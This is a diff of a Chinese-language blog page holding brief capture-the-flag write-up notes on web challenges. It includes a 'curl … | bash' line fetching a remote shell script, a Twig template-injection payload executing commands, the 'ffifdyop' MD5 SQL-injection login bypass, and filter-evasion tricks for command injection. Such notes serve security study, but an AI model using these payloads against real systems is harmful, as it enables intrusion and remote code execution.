@@ -62,7 +62,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;1.JPG">
 <meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7178.JPG">
 <meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7178.JPG">
-<meta property="og:updated_time" content="2020-06-10T14:28:31.902Z">
+<meta property="og:updated_time" content="2020-06-11T15:18:04.183Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;2.JPG">
 
@@ -239,7 +239,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-06-10 22:28:31" itemprop="dateModified" datetime="2020-06-10T22:28:31+08:00">2020-06-10</time>
+                <time title="修改时间：2020-06-11 23:18:04" itemprop="dateModified" datetime="2020-06-11T23:18:04+08:00">2020-06-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -289,11 +289,13 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ipaddr/shell.txt|bash</span><br></pre></td></tr></table></figure>
 <p>成功反弹shell，然后这道题根目录下的flag是假的，用find命令查找flag即可</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name “flag”</span><br></pre></td></tr></table></figure>
-<p>4.假猪套天下第一<br>这道题随便输用户名密码登陆后有个跳转，抓包看看有提示L0g1in.php，然后就是根据他的提示一步步的补充修改http headrs即可</p>
+<p>4.假猪套天下第一<br>这道题随便输用户名密码登陆后有个跳转，抓包看看有提示L0g1in.php，然后就是根据他的提示一步步的补充修改http headrs即可<br>5.easyMD5<br>ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’<br>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数<br>6.Mark love cats:$$导致的变量覆盖<br>7.mystery of ip:基于Twig模板的ssti注入用现成的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>即可</p>
 <!-- toc -->
 <h3 id="极客大挑战"><a href="#极客大挑战" class="headerlink" title="极客大挑战"></a>极客大挑战</h3><p>1.sql注入系列<br>easysql:万能密码即可<br>lovesql：没有什么过滤的sql注入，拼接常规的sql注入语句即可<br>babysql:双写绕过<br>hardsql：报错注入<br>finalsql：用异或构造布尔盲注<br>2.havefun：get传参即可获得flag<br>3.secretfile:file伪协议读取文件<br>4.php:简单的反序列化，绕过_wakeup函数即可<br>5.knife：菜刀直接连即可<br>6.http：按照提示，一步步修改http请求头即可<br>7.buyflag；数组绕过strcmp函数即可<br>8.upload:1.phtml绕过黑名单检测2.增加文件头GIF89a绕过图像检测<br>9.RCEME:1.url编码取反绕过正则检测2.重新写入一个shell用蚁剑连接3.上传php7的poc绕过disabled-functions（<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php）" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php）</a></p>
 <!-- toc -->
-<h3 id="GXYCTF2019"><a href="#GXYCTF2019" class="headerlink" title="GXYCTF2019"></a>GXYCTF2019</h3><p>1.pingp ping ping :1.$IFS$9绕过空格过滤2.变量名拼接a=l;b=s;$a$b 绕过敏感字符过滤</p>
+<h3 id="GXYCTF2019"><a href="#GXYCTF2019" class="headerlink" title="GXYCTF2019"></a>GXYCTF2019</h3><p>1.ping ping ping :1.$IFS$9绕过空格过滤2.变量名拼接a=l;b=s;$a$b 绕过敏感字符过滤<br>2.babysqli：1.常规的联合查询注入，猜测后端为md5比较 2.当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据在数据库中<br>3.禁止套娃L:无参数RCE<br>列文件：localeconv() 函数：<br> 返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br> current() 返回数组中的当前单元, 默认取第一个值。所以current(localeconv())的值就是一个点<br> scandir(current(localeconv()))就是列出当前目录下的文件<br> 查看文件：session_id(session_start())获取到当前的session id，将session_id的值设置为我们想要看的文件名即可<br> 4.babyupload：js引用php绕过&lt;?过滤</p>
 
     </div>
 
